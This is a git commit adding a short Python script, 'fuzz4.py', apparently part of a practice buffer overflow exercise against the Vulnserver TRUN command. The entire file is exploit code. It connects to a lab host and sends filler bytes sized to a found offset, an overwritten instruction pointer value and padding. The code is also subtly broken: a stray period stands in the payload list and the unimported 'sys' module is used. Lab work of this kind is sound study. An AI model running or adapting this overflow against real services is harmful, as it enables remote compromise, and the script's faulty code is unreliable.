56e5ddc16e0dbf6f10cbf767e38f9ee4e36c59f0
Can ÖZKAN <72666934+can-ozkan@users.noreply.github.com>
2025-02-18 22:36:14 +0100

    Create fuzz4.py

---
+++ VulnServerBufferOverflow/fuzz4.py
@@ -0,0 +1,28 @@
+import socket
+import struct
+
+length = 2992
+
+try: 
+
+    offset = 2003
+    new_eip = struct.pack("<I", 0x62501203)
+
+    s = socket.socket()
+    s.connect( ("192.168.168.11", 9999) )
+
+    payload = [
+        b"TRUN /.:/",
+        b"A" * offset.
+        new_eip,
+        b"C" * 976
+    ]
+
+    payload = b"".join(payload)
+
+    s.send(payload)
+    s.close()
+    
+except:
+    print("Could not connect to the target server")
+    sys.exit(1)    
